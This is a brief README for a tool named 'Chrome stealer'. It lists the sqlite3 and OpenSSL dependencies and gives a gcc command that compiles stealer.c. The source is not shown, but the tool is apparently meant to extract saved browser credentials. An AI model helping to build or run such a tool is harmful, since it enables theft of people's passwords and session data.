# Chrome stealer

## Install depencies

[sqlite3.h](https://www.sqlite.org/download.html)

[openssl](https://www.openssl.org/source/)

You can also install OpenSSL library with `chocolatey`

```bash
choco install openssl -y
```

---

Compile:

```bash
gcc -o stealer stealer.c -lssl -lcrypto -lshlwapi
```

